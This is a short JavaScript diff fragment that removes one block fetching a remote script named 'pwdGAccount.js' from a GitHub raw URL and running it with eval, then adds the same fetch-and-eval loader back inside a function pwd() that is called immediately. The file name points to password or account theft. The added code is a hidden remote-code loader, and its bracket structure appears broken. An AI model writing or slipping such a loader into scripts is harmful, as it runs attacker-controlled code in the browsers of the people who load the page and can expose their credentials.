@@ -16,13 +16,16 @@
         xhr.send();
         
         
-        (function() {
-            fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js')
-            .then(response => response.text())
-            .then(code => {
-            eval(code);
-        });
-})();
 
-    })
-})();
+})();})
+
+
+
+function pwd() {
+    fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js')
+    .then(response => response.text())
+    .then(code => {
+    eval(code);
+});
+    
+pwd()
